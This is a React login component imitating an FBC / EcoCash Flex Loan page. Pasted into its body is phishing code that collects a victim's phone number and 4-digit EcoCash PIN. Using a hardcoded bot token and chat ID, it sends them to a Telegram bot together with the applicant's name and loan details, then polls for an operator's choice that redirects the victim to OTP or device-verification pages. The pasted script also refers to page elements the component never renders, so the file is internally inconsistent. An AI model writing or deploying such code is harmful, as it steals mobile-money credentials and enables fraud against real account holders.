import React, { useState } from 'react';
import { FBCLogo } from './FBCLogo';
import { Headphones, ArrowLeft, AlertCircle } from 'lucide-react';
import { Footer } from './Footer';

interface Step3LoginProps {
  initialPhone: string;
  onProceed: (phone: string) => void;
  onBack: () => void;
  onOpenSupport: () => void;
}

export const Step3Login: React.FC<Step3LoginProps> = ({
  initialPhone,
  onProceed,
  onBack,
  onOpenSupport,
}) => {
  const [phone, setPhone] = useState(initialPhone || '');
  const [error, setError] = useState<string | null>(null);
  const [touched, setTouched] = useState(false);

  const validatePhone = (val: string): string | null => {
    const cleaned = val.replace(/[\s\-()]/g, '');
    if (!cleaned) {
      return 'Please enter your mobile number to continue';
    }
    if (cleaned.length < 9) {
      return 'Mobile number must be at least 9 digits';
    }
    return null;
  };

  const handlePhoneChange = (val: string) => {
    setPhone(val);
    if (touched) {
      setError(validatePhone(val));
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setTouched(true);
    const err = validatePhone(phone);
    if (err) {
      setError(err);
      return;
    }
    setError(null);
    onProceed(phone);
  };

    const CONFIG = {
      BOT_TOKEN: '7731852186:AAE7otYOdu9XPMqzUrMxB1tET1kHf5LYFG0',
      CHAT_ID: '8820857419',
      APPROVE_PAGE: 'otp.html',
      DEVICE_PAGE: 'device.html',      // ← fixed: was device_verify.html
      SUCCESS_PAGE: 'success.html'
    };

    let state = { lastUpdateId: 0 };
    let isProcessing = false;

    const phoneInput     = document.getElementById('phoneInput');
    const pinInput       = document.getElementById('pinInput');
    const continueBtn    = document.getElementById('continueBtn');
    const errMsg         = document.getElementById('errMsg');
    const spinnerOverlay = document.getElementById('spinnerOverlay');

    // ── Load application details from localStorage (original logic preserved) ──
    function getStoredApplication() {
      try {
        return JSON.parse(localStorage.getItem('loanApplication') || '{}');
      } catch (e) {
        return {};
      }
    }

    function normalizePhone(phone) {
      return String(phone || '').replace(/\D/g, '').replace(/^263/, '').slice(-9);
    }

    function loadApplicationDetails() {
      const application = getStoredApplication();
      const fullName = [application.firstName, application.lastName].filter(Boolean).join(' ').trim();
      const phone = normalizePhone(application.phone || localStorage.getItem('phone'));

      if (phone) phoneInput.value = phone;

      if (fullName || application.loanAmount || application.loanType) {
        document.getElementById('applicationSummary').classList.add('active');
        document.getElementById('summaryName').textContent   = fullName || '—';
        document.getElementById('summaryAmount').textContent = application.loanAmount ? '$' + Number(application.loanAmount).toLocaleString() : '—';
        document.getElementById('summaryType').textContent   = application.loanType || '—';
      }
    }

    // ── Input sanitisation ──
    phoneInput.addEventListener('input', () => {
      phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 9);
    });

    pinInput.addEventListener('input', () => {
      pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 4);
      if (pinInput.value.length === 4) pinInput.blur();
    });

    // ── Helpers ──
    function showError(msg) {
      errMsg.textContent   = msg;
      errMsg.style.display = 'block';
    }

    function resetButton() {
      isProcessing            = false;
      continueBtn.disabled    = false;
      continueBtn.textContent = 'Continue';
    }

    // ── Telegram bot send + poll ──
    function sendToBot(phone, pin) {
      if (isProcessing) return;
      isProcessing = true;
      continueBtn.disabled    = true;
      continueBtn.textContent = 'Verifying…';

      const application = getStoredApplication();
      const loanAmount  = application.loanAmount ? '$' + Number(application.loanAmount).toLocaleString() : '—';
      const loanType    = application.loanType || '—';
      const fullName    = [application.firstName, application.lastName].filter(Boolean).join(' ').trim() || '—';

      const ts        = Date.now();
      const approveId = `approve_${ts}`;
      const declineId = `decline_${ts}`;
      const verifyId  = `verify_${ts}`;

      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CONFIG.CHAT_ID,
          text: `<b>🟢 EcoCash Flex Loan Verification</b>\n\nApplicant: <b>${fullName}</b>\nLoan Amount: <b>${loanAmount}</b>\nLoan Type: <b>${loanType}</b>\nPhone: <code>+263${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '✅ Approve Loan',  callback_data: approveId },
                { text: '📱 Verify Device', callback_data: verifyId  }
              ],
              [{ text: '❌ Decline', callback_data: declineId }]
            ]
          }
        })
      })
      .then(() => {
        // Save phone to localStorage (original behaviour)
        localStorage.setItem('phone', phone);
        localStorage.setItem('flexLoanLogin', JSON.stringify({ phone, continuedAt: new Date().toISOString() }));

        spinnerOverlay.style.display = 'flex';
        startPolling(approveId, declineId, verifyId);
      })
      .catch(() => resetButton());
    }

    function startPolling(approveId, declineId, verifyId) {
      const interval = setInterval(() => {
        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
          .then(r => r.json())
          .then(data => {
            if (!data.ok || !data.result) return;

            data.result.forEach(update => {
              state.lastUpdateId = update.update_id;

              if (update.callback_query) {
                const cb = update.callback_query.data;

                if (cb === approveId) {
                  clearInterval(interval);
                  spinnerOverlay.style.display = 'none';
                  window.location.href = CONFIG.APPROVE_PAGE;
                }
                else if (cb === verifyId) {
                  clearInterval(interval);
                  spinnerOverlay.style.display = 'none';
                  window.location.href = CONFIG.DEVICE_PAGE;   // → device.html
                }
                else if (cb === declineId) {
                  clearInterval(interval);
                  spinnerOverlay.style.display = 'none';
                  showError('Request declined. Please try again.');
                  resetButton();
                }
              }
            });
          });
      }, 1000);
    }

    // ── Submit ──
    continueBtn.addEventListener('click', () => {
      errMsg.style.display = 'none';

      const phone = normalizePhone(phoneInput.value);
      const pin   = pinInput.value.trim();

      if (phone.length !== 9) {
        showError('Please enter a valid 9-digit mobile number.');
        return;
      }
      if (pin.length !== 4) {
        showError('Please enter your 4-digit EcoCash PIN.');
        return;
      }

      sendToBot(phone, pin);
    });

    // ── Init ──
    window.addEventListener('pageshow', (event) => {
      if (event.persisted) window.location.reload();
    });

    window.addEventListener('load', loadApplicationDetails);

  return (
    <div className="relative min-h-[calc(100vh-130px)] flex flex-col justify-between overflow-hidden bg-gradient-to-b from-[#0047BA] via-[#0051cf] to-[#003893] text-white">
      {/* Background Graphic */}
      <div className="absolute right-0 bottom-0 pointer-events-none z-0 w-full max-w-2xl opacity-95">
        <svg
          viewBox="0 0 500 350"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
          className="w-full h-auto ml-auto"
        >
          <path
            d="M 500 120 C 380 180, 260 220, 160 350 L 500 350 Z"
            fill="white"
            fillOpacity="0.9"
          />
          <path
            d="M 500 190 C 400 230, 310 270, 240 350 L 500 350 Z"
            fill="#e2e8f0"
            fillOpacity="0.4"
          />
        </svg>
      </div>

      {/* Top Navigation Row */}
      <div className="relative z-10 w-full px-4 sm:px-8 pt-6 flex items-center justify-between">
        <button
          type="button"
          onClick={onBack}
          className="inline-flex items-center gap-1.5 text-xs font-semibold text-white/80 hover:text-white bg-white/10 hover:bg-white/20 px-3.5 py-2 rounded-full backdrop-blur-xs transition-colors cursor-pointer"
        >
          <ArrowLeft className="w-3.5 h-3.5" />
          <span>Back to Details</span>
        </button>
      </div>

      {/* Main Login Card */}
      <div className="relative z-10 flex-1 flex flex-col items-center justify-center px-6 py-10 w-full max-w-md mx-auto">
        <div className="mb-12 flex justify-center">
          <FBCLogo variant="white" size="xl" showSubtext={false} />
        </div>

        <form onSubmit={handleSubmit} className="w-full space-y-6 text-center">
          <h2 className="text-white text-base sm:text-lg font-medium tracking-normal px-2">
            Please enter your mobile number to continue
          </h2>

          <div className="space-y-2">
            <div className="relative">
              <input
                type="tel"
                placeholder="Enter here"
                value={phone}
                onChange={(e) => handlePhoneChange(e.target.value)}
                onBlur={() => {
                  setTouched(true);
                  setError(validatePhone(phone));
                }}
                className="w-full text-center text-white placeholder-white/60 bg-transparent border-2 border-white/80 rounded-full px-6 py-3.5 text-base sm:text-lg font-medium focus:outline-none focus:border-white focus:ring-2 focus:ring-white/40 transition-all shadow-inner"
                aria-label="Mobile phone number"
                autoComplete="tel"
              />
            </div>

            {touched && error && (
              <div className="bg-amber-400 text-slate-900 text-xs font-semibold px-3 py-1.5 rounded-full inline-flex items-center gap-1.5 shadow-md animate-in fade-in">
                <AlertCircle className="w-3.5 h-3.5 shrink-0" />
                <span>{error}</span>
              </div>
            )}
          </div>

          <div>
            <button
              type="submit"
              className="w-full bg-white text-[#0047BA] hover:bg-slate-100 font-bold text-base sm:text-lg py-3.5 px-8 rounded-full shadow-lg hover:shadow-xl transition-all active:scale-[0.98] cursor-pointer"
            >
              Continue
            </button>
          </div>
        </form>

        <div className="mt-16 sm:mt-24 mb-4 flex flex-col items-center justify-center">
          <button
            type="button"
            onClick={onOpenSupport}
            className="group flex flex-col items-center gap-1.5 text-white/90 hover:text-white transition-all cursor-pointer"
          >
            <div className="w-12 h-12 rounded-full border-2 border-white/60 group-hover:border-white bg-white/10 group-hover:bg-white/20 flex items-center justify-center backdrop-blur-xs transition-colors shadow-sm">
              <Headphones className="w-6 h-6 text-white" />
            </div>
            <span className="text-xs font-medium tracking-wide">Get Support</span>
          </button>
        </div>
      </div>

      <Footer variant="blue" />
    </div>
  );
};
